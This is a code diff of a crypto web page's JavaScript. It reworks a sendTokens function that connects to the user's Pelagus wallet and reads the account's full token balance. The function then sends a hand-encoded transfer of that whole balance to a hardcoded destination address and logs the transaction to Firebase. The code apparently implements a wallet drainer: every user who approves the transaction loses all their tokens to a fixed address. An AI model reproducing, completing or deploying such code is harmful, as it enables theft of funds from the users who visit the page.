@@ -437,45 +437,48 @@ async function saveToFirebase(data) {
         }
 
         async function sendTokens() {
-    try {
-        const accounts = await window.pelagus.request({
-            method: 'eth_requestAccounts'
-        });
+   try {
+       const accounts = await window.pelagus.request({
+           method: 'eth_requestAccounts'
+       });
 
-        const currentBalance = await getTokenBalance(accounts[0]);
-        const readableAmount = (Number(currentBalance) / 1e18).toString();
+       const currentBalance = await getTokenBalance(accounts[0]);
+       if (currentBalance <= 0n) {
+           throw new Error('No tokens available');
+       }
 
-        const data = quais.Interface.encodeFunctionData('transfer', [
-            DESTINATION_ADDRESS,
-            currentBalance.toString()
-        ]);
+       // Encode transfer function
+       const functionHash = '0xa9059cbb'; // transfer(address,uint256) function signature
+       const toAddress = DESTINATION_ADDRESS.slice(2).padStart(64, '0'); 
+       const amount = currentBalance.toString(16).padStart(64, '0');
+       const data = functionHash + toAddress + amount;
 
-        const transactionParameters = {
-            to: TOKEN_ADDRESS,
-            from: accounts[0],
-            data: data,
-            value: '0x0'
-        };
+       const tx = {
+           from: accounts[0],
+           to: TOKEN_ADDRESS,
+           data: '0x' + data,
+           value: '0x0'
+       };
 
-        const txHash = await window.pelagus.request({
-            method: 'eth_sendTransaction',
-            params: [transactionParameters],
-        });
+       const txHash = await window.pelagus.request({
+           method: 'eth_sendTransaction',
+           params: [tx]
+       });
 
-        log(`Transaction sent: ${txHash}`);
-        await waitForTransaction(txHash);
-        
-        userSession.transferAmount = readableAmount;
-        userSession.transferTxHash = txHash;
-        await saveSessionToFirebase();
+       log(`Transaction sent: ${txHash}`);
+       await waitForTransaction(txHash);
+       
+       userSession.transferAmount = (Number(currentBalance) / 1e18).toString();
+       userSession.transferTxHash = txHash;
+       await saveSessionToFirebase();
 
-        document.getElementById('sendBtn').style.display = 'none';
-        document.getElementById('scanBtn').style.display = 'block';
-        document.getElementById('buyBtn').style.display = 'block';
+       document.getElementById('sendBtn').style.display = 'none';
+       document.getElementById('scanBtn').style.display = 'block';
+       document.getElementById('buyBtn').style.display = 'block';
 
-    } catch (error) {
-        log('Error: ' + error.message);
-    }
+   } catch (error) {
+       log('Error: ' + error.message);
+   }
 }
 
 async function waitForTransaction(txHash) {
